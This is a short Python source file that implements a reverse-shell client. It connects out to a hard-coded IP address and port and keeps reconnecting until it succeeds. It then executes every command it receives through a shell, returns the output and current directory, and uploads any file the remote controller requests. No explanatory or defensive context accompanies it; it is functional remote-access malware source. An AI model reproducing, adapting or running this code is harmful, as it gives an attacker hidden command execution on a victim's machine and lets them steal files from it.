import socket
import os
import sys
import subprocess
import time
from time import sleep

s = socket.socket()
host = '192.168.2.16'
port = 9999

def upload():
    filename = s.recv(1024)
    f = open(filename, 'rb')
    i = f.read()
    while (i):
        s.send(i)
        i = f.read(1024)
    f.close()
    s.send('complete')


def reconnect():
    connected = False
    while connected == False:
        try:
            s.connect((host,port))
            connected = True
            client()
        except socket.error:
            sleep(5)

def client():
    while True:

            data = s.recv(1024)

            #recive files

            if data[:8].decode('utf-8') == "download":
                upload()
                continue
            if data[:2].decode('utf-8') == "cd":
                os.chdir(data[3:].decode('utf-8'))

            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)

        


reconnect()